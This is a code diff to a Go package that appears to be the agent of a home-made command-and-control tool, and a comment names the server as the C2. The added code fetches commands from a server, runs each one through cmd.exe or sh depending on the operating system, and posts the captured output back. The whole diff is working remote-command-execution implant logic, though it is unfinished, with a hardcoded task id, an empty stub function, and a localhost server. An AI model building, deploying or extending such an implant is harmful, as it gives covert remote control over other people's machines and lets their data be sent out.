@@ -1,15 +1,21 @@
 package utils
 
 import (
+	"bytes"
 	"encoding/json"
-	"errors"
 	"io"
 	"log"
 	"net/http"
 	"os/exec"
+	"runtime"
 )
 
 const BASE_URL = "http://127.0.0.1:8000"
+
+func DataCollection() string {
+	// For now OS -> Then exec type, env, etc..
+	return runtime.GOOS
+}
 
 func GetAgentId() string {
 	resp, err := http.Post(BASE_URL+"/connect", "", nil)
@@ -59,7 +65,6 @@ func GetCommand(agentId string) {
 	defer resp.Body.Close()
 
 	body, err := io.ReadAll(resp.Body)
-	log.Printf("Body BRUTE : %s", body)
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -75,19 +80,83 @@ func GetCommand(agentId string) {
 		log.Fatalln(err)
 	}
 
-	log.Printf(result.Command)
+	if result.Command == "" { // Crash protection
+		log.Printf("No command - Exiting")
+		return
+	}
 
 	// Execution de la commande
-	resultAction := exec.Command(result.Command)
-	if errors.Is(err, exec.ErrDot) {
-		err = nil
+	var clientOs string
+	clientOs = DataCollection() // Getting OS env
+
+	var cmd *exec.Cmd
+
+	if clientOs == "windows" {
+		cmd = exec.Command("cmd.exe", "/C", result.Command)
+	} else {
+		cmd = exec.Command("sh", "-c", result.Command)
 	}
+
+	// Catch output instead of Stdout
+	output, err := cmd.CombinedOutput() // stdout + sterrr
 	if err != nil {
-		log.Fatal(err)
+		log.Printf("Error exec : %s", err)
 	}
+
+	//log.Printf("Command OUTPUT : %s\n", string(output))
+	log.Printf("Command successfully executed")
 
 	// Enregistrement du résultat
+	var toSend string
+	var task_id string
+	toSend = string(output)
+	task_id = "2" // Need struc to gather it from pevious API call
+
+	// Send to server -
+	sendResult(agentId, toSend, task_id)
 
 }
-func sendResult() {}
-func die()        {}
+
+// Send Result to C2 Server
+func sendResult(agentId string, output string, taskId string) bool {
+
+	type DataSend struct {
+		TaskId string `json:"task_id"`
+		Stdout string `json:"stdout"`
+		Stderr string `json:"stderr"`
+	}
+
+	dataSend := DataSend{TaskId: taskId, Stdout: output, Stderr: "None"}
+
+	data, err := json.Marshal(dataSend)
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	resp, err := http.Post(BASE_URL+"/result/"+agentId, "application/json", bytes.NewBuffer(data))
+	if err != nil {
+		log.Fatalln(err)
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	type Response struct {
+		Status string `json:"status"`
+	}
+
+	var result Response
+	err = json.Unmarshal(body, &result)
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	log.Printf("Status %s\n", result.Status)
+	return result.Status == "ok"
+
+}
+
+func die() {}
